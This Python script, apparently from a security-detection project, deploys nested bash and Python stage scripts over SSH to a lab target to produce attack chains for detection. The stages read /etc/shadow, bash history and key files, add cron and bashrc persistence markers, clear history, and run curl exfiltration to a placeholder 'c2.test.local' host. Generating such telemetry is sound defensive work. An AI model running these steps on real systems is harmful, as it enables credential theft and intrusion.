#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
长攻击链生成脚本 - 用于 FusionTrace 攻击链演示

设计目标：
生成深层嵌套的进程调用关系，产生长攻击链，便于在 FusionTrace 中展示攻击溯源效果。

核心原理：
不是直接执行多个独立命令，而是创建一个"攻击脚本链"，每个脚本调用下一个脚本，
形成真正的进程父子关系：

    sshd → bash(stage1.sh) → python3(stage2.py) → bash(stage3.sh) → find → ...

这样在 Wazuh Auditd 日志中会产生真正的 SPAWNED 关系链。

使用方法：
    python chain_attack.py --victim <IP> --user <用户> --password <密码>

实验环境：
    服务器 C (攻击机) → 服务器 B (靶机，Wazuh Agent) → 服务器 A (Wazuh Manager)
"""

import argparse
import time
import os
from typing import Optional

try:
    import paramiko
except ImportError:
    print("请安装 paramiko: pip install paramiko")
    exit(1)


class ChainAttackSimulator:
    """长攻击链模拟器"""
    
    def __init__(self, victim_ip: str, user: str, password: str, port: int = 22):
        self.victim_ip = victim_ip
        self.user = user
        self.password = password
        self.port = port
        self.client: Optional[paramiko.SSHClient] = None
        self.work_dir = "/tmp/chain_attack"
    
    def connect(self) -> bool:
        """建立 SSH 连接"""
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            self.client.connect(
                hostname=self.victim_ip,
                port=self.port,
                username=self.user,
                password=self.password,
                timeout=15
            )
            print(f"[+] SSH 连接成功: {self.user}@{self.victim_ip}")
            return True
        except Exception as e:
            print(f"[-] SSH 连接失败: {e}")
            return False
    
    def execute(self, cmd: str, timeout: int = 60) -> tuple:
        """执行命令"""
        if not self.client:
            return -1, "", "Not connected"
        try:
            stdin, stdout, stderr = self.client.exec_command(cmd, timeout=timeout)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            code = stdout.channel.recv_exit_status()
            return code, out, err
        except Exception as e:
            return -1, "", str(e)
    
    def close(self):
        """关闭连接"""
        if self.client:
            self.client.close()
    
    def run(self):
        """运行攻击链"""
        print("\n" + "=" * 70)
        print("  FusionTrace 长攻击链生成器")
        print("=" * 70)
        
        if not self.connect():
            return
        
        try:
            # 1. 创建工作目录
            print("\n[*] 阶段 1: 准备攻击环境")
            self.execute(f"mkdir -p {self.work_dir}")
            
            # 2. 部署攻击链脚本
            print("[*] 阶段 2: 部署攻击链脚本")
            self._deploy_chain_scripts()
            
            # 3. 执行主攻击脚本（触发整个攻击链）
            print("[*] 阶段 3: 执行攻击链")
            print("    这将产生嵌套的进程调用关系...")
            
            # 执行主脚本，它会递归调用其他脚本
            code, out, err = self.execute(
                f"bash {self.work_dir}/stage1_recon.sh",
                timeout=120
            )
            
            if code == 0:
                print("[+] 攻击链执行完成")
                print("\n--- 攻击链输出 ---")
                print(out[:2000] if len(out) > 2000 else out)
            else:
                print(f"[-] 执行出错: {err}")
            
            # 4. 执行第二条攻击链（横向移动模拟）
            print("\n[*] 阶段 4: 执行第二条攻击链（持久化）")
            code, out, err = self.execute(
                f"bash {self.work_dir}/stage1_persist.sh",
                timeout=120
            )
            
            if code == 0:
                print("[+] 持久化攻击链执行完成")
            
            # 5. 执行第三条攻击链（数据收集外泄）
            print("\n[*] 阶段 5: 执行第三条攻击链（数据收集）")
            code, out, err = self.execute(
                f"bash {self.work_dir}/stage1_exfil.sh",
                timeout=120
            )
            
            if code == 0:
                print("[+] 数据收集攻击链执行完成")
            
            # 6. 清理（可选）
            print("\n[*] 阶段 6: 清理痕迹")
            self._cleanup()
            
        finally:
            self.close()
        
        print("\n" + "=" * 70)
        print("  攻击链生成完成！")
        print("  请在 FusionTrace 前端查看攻击链溯源结果")
        print("=" * 70)
    
    def _deploy_chain_scripts(self):
        """部署形成攻击链的脚本"""
        
        # ============================================================
        # 攻击链 1: 侦察链 (5层深度)
        # bash → python3 → bash → find/cat/head
        # ============================================================
        
        # Stage 1: 入口脚本 (bash)
        stage1_recon = '''#!/bin/bash
# Stage 1: 侦察入口 - 调用 Python 进行系统枚举
echo "[Chain1-Stage1] 开始侦察..."
echo "[Chain1-Stage1] 调用 Python 侦察模块..."

# 调用 Stage 2 (Python)
python3 /tmp/chain_attack/stage2_enum.py
'''
        
        # Stage 2: Python 枚举脚本
        stage2_enum = '''#!/usr/bin/env python3
# Stage 2: Python 系统枚举 - 调用 bash 进行深度扫描
import subprocess
import os

print("[Chain1-Stage2] Python 枚举模块启动")
print("[Chain1-Stage2] 收集系统信息...")

# 基础信息收集
os.system("id")
os.system("hostname")

print("[Chain1-Stage2] 调用深度扫描模块...")

# 调用 Stage 3 (bash)
subprocess.call(["bash", "/tmp/chain_attack/stage3_deepscan.sh"])
'''
        
        # Stage 3: 深度扫描脚本 (bash)
        stage3_deepscan = '''#!/bin/bash
# Stage 3: 深度扫描 - 调用多个子命令
echo "[Chain1-Stage3] 深度扫描开始..."

# 系统信息 (会产生 bash → uname 的关系)
echo "[Chain1-Stage3] 获取系统版本..."
uname -a

# 网络信息 (会产生 bash → ip 的关系)
echo "[Chain1-Stage3] 获取网络配置..."
ip addr 2>/dev/null || ifconfig

# 调用 Stage 4 (文件搜索)
echo "[Chain1-Stage3] 调用文件搜索模块..."
bash /tmp/chain_attack/stage4_filesearch.sh
'''
        
        # Stage 4: 文件搜索脚本
        stage4_filesearch = '''#!/bin/bash
# Stage 4: 文件搜索 - 搜索敏感文件
echo "[Chain1-Stage4] 文件搜索开始..."

# 搜索配置文件 (bash → find)
echo "[Chain1-Stage4] 搜索配置文件..."
find /etc -name "*.conf" -type f 2>/dev/null | head -5

# 搜索密钥文件 (bash → find)
echo "[Chain1-Stage4] 搜索密钥文件..."
find /home -name "*.pem" -o -name "*.key" 2>/dev/null | head -3

# 调用 Stage 5 (凭据提取)
echo "[Chain1-Stage4] 调用凭据提取模块..."
bash /tmp/chain_attack/stage5_creds.sh
'''
        
        # Stage 5: 凭据提取脚本
        stage5_creds = '''#!/bin/bash
# Stage 5: 凭据提取 - 读取敏感文件
echo "[Chain1-Stage5] 凭据提取开始..."

# 读取 passwd (bash → cat)
echo "[Chain1-Stage5] 读取用户列表..."
cat /etc/passwd | head -10

# 读取 shadow 尝试 (bash → cat)
echo "[Chain1-Stage5] 尝试读取密码哈希..."
cat /etc/shadow 2>/dev/null | head -3 || echo "无权限"

# 读取 SSH 配置 (bash → cat)
echo "[Chain1-Stage5] 读取 SSH 配置..."
cat /etc/ssh/sshd_config 2>/dev/null | head -10

# 搜索历史命令 (bash → cat)
echo "[Chain1-Stage5] 读取命令历史..."
cat ~/.bash_history 2>/dev/null | tail -20

echo "[Chain1-Stage5] 侦察链完成!"
'''
        
        # ============================================================
        # 攻击链 2: 持久化链 (4层深度)
        # bash → python3 → bash → crontab/chmod
        # ============================================================
        
        stage1_persist = '''#!/bin/bash
# Stage 1: 持久化入口
echo "[Chain2-Stage1] 开始持久化..."
echo "[Chain2-Stage1] 调用持久化模块..."

# 调用 Python 持久化脚本
python3 /tmp/chain_attack/stage2_persist.py
'''
        
        stage2_persist = '''#!/usr/bin/env python3
# Stage 2: Python 持久化控制器
import subprocess
import os

print("[Chain2-Stage2] 持久化控制器启动")

# 创建后门脚本
backdoor = """#!/bin/bash
echo "beacon" > /dev/null
"""

with open("/tmp/chain_attack/backdoor.sh", "w") as f:
    f.write(backdoor)

print("[Chain2-Stage2] 调用持久化安装模块...")
subprocess.call(["bash", "/tmp/chain_attack/stage3_install.sh"])
'''
        
        stage3_install = '''#!/bin/bash
# Stage 3: 持久化安装
echo "[Chain2-Stage3] 安装持久化..."

# 设置执行权限 (bash → chmod)
chmod +x /tmp/chain_attack/backdoor.sh

# 尝试添加 cron 任务 (bash → crontab)
echo "[Chain2-Stage3] 配置 cron 任务..."
(crontab -l 2>/dev/null; echo "# test task") | crontab - 2>/dev/null

# 修改 bashrc (bash → echo/cat)
echo "[Chain2-Stage3] 修改启动脚本..."
echo "# persistence test" >> ~/.bashrc 2>/dev/null

# 调用清理模块
bash /tmp/chain_attack/stage4_hide.sh
'''
        
        stage4_hide = '''#!/bin/bash
# Stage 4: 隐藏痕迹
echo "[Chain2-Stage4] 隐藏痕迹..."

# 修改时间戳 (bash → touch)
touch -r /etc/passwd /tmp/chain_attack/backdoor.sh

# 清理历史 (bash → history)
history -c 2>/dev/null

echo "[Chain2-Stage4] 持久化链完成!"
'''
        
        # ============================================================
        # 攻击链 3: 数据收集外泄链 (5层深度)
        # bash → python3 → bash → tar → base64/curl
        # ============================================================
        
        stage1_exfil = '''#!/bin/bash
# Stage 1: 数据收集入口
echo "[Chain3-Stage1] 开始数据收集..."
python3 /tmp/chain_attack/stage2_collect.py
'''
        
        stage2_collect = '''#!/usr/bin/env python3
# Stage 2: 数据收集控制器
import subprocess
import os

print("[Chain3-Stage2] 数据收集控制器启动")

# 创建收集目录
os.makedirs("/tmp/chain_attack/loot", exist_ok=True)

# 收集系统信息到文件
with open("/tmp/chain_attack/loot/sysinfo.txt", "w") as f:
    f.write("=== System Info ===\\n")

print("[Chain3-Stage2] 调用数据打包模块...")
subprocess.call(["bash", "/tmp/chain_attack/stage3_package.sh"])
'''
        
        stage3_package = '''#!/bin/bash
# Stage 3: 数据打包
echo "[Chain3-Stage3] 打包数据..."

# 收集更多信息
echo "Users:" > /tmp/chain_attack/loot/users.txt
cat /etc/passwd >> /tmp/chain_attack/loot/users.txt

echo "Network:" > /tmp/chain_attack/loot/network.txt
ip addr >> /tmp/chain_attack/loot/network.txt 2>/dev/null

# 打包数据 (bash → tar)
echo "[Chain3-Stage3] 创建归档..."
tar -czvf /tmp/chain_attack/loot.tar.gz -C /tmp/chain_attack/loot . 2>/dev/null

# 调用外泄模块
bash /tmp/chain_attack/stage4_encode.sh
'''
        
        stage4_encode = '''#!/bin/bash
# Stage 4: 数据编码
echo "[Chain3-Stage4] 编码数据..."

# Base64 编码 (bash → base64)
base64 /tmp/chain_attack/loot.tar.gz > /tmp/chain_attack/loot.b64 2>/dev/null

# 计算哈希 (bash → md5sum)
md5sum /tmp/chain_attack/loot.tar.gz 2>/dev/null

# 调用外泄模块
bash /tmp/chain_attack/stage5_exfil.sh
'''
        
        stage5_exfil = '''#!/bin/bash
# Stage 5: 数据外泄
echo "[Chain3-Stage5] 模拟数据外泄..."

# DNS 外泄模拟 (bash → nslookup)
nslookup exfil.test.local 2>/dev/null || echo "DNS exfil simulated"

# HTTP 外泄模拟 (bash → curl)
curl -s -m 2 http://c2.test.local/upload 2>/dev/null || echo "HTTP exfil simulated"

# 清理临时文件
rm -f /tmp/chain_attack/loot.b64

echo "[Chain3-Stage5] 数据收集链完成!"
'''
        
        # 部署所有脚本
        scripts = {
            # 攻击链 1: 侦察
            "stage1_recon.sh": stage1_recon,
            "stage2_enum.py": stage2_enum,
            "stage3_deepscan.sh": stage3_deepscan,
            "stage4_filesearch.sh": stage4_filesearch,
            "stage5_creds.sh": stage5_creds,
            # 攻击链 2: 持久化
            "stage1_persist.sh": stage1_persist,
            "stage2_persist.py": stage2_persist,
            "stage3_install.sh": stage3_install,
            "stage4_hide.sh": stage4_hide,
            # 攻击链 3: 数据收集
            "stage1_exfil.sh": stage1_exfil,
            "stage2_collect.py": stage2_collect,
            "stage3_package.sh": stage3_package,
            "stage4_encode.sh": stage4_encode,
            "stage5_exfil.sh": stage5_exfil,
        }
        
        for filename, content in scripts.items():
            filepath = f"{self.work_dir}/{filename}"
            # 使用 heredoc 写入文件
            escaped_content = content.replace("'", "'\\''")
            cmd = f"cat > {filepath} << 'SCRIPT_EOF'\n{content}\nSCRIPT_EOF"
            self.execute(cmd)
            
            # 设置执行权限
            self.execute(f"chmod +x {filepath}")
        
        print(f"    已部署 {len(scripts)} 个攻击链脚本")
    
    def _cleanup(self):
        """清理攻击痕迹"""
        # 恢复 crontab
        self.execute("crontab -l 2>/dev/null | grep -v 'test task' | crontab - 2>/dev/null")
        
        # 清理 bashrc
        self.execute("sed -i '/persistence test/d' ~/.bashrc 2>/dev/null")
        
        # 删除攻击文件（注释掉以便查看日志）
        # self.execute(f"rm -rf {self.work_dir}")
        
        print("    清理完成（保留攻击脚本以便分析）")


def main():
    parser = argparse.ArgumentParser(
        description="FusionTrace 长攻击链生成器",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
    python chain_attack.py --victim 172.31.65.4 --user root --password 'Bupt2023'

说明:
    此脚本会在靶机上部署多层嵌套的攻击脚本，形成深层进程调用链：
    
    攻击链 1 (侦察): bash → python3 → bash → find → cat (5层)
    攻击链 2 (持久化): bash → python3 → bash → crontab (4层)  
    攻击链 3 (外泄): bash → python3 → bash → tar → curl (5层)
    
    这些链会在 Wazuh Auditd 日志中产生真正的 SPAWNED 父子关系，
    便于在 FusionTrace 中展示完整的攻击链溯源效果。
        """
    )
    
    parser.add_argument("--victim", required=True, help="靶机 IP 地址")
    parser.add_argument("--user", required=True, help="SSH 用户名")
    parser.add_argument("--password", required=True, help="SSH 密码")
    parser.add_argument("--port", type=int, default=22, help="SSH 端口 (默认: 22)")
    
    args = parser.parse_args()
    
    attacker = ChainAttackSimulator(
        victim_ip=args.victim,
        user=args.user,
        password=args.password,
        port=args.port
    )
    
    attacker.run()


if __name__ == "__main__":
    main()
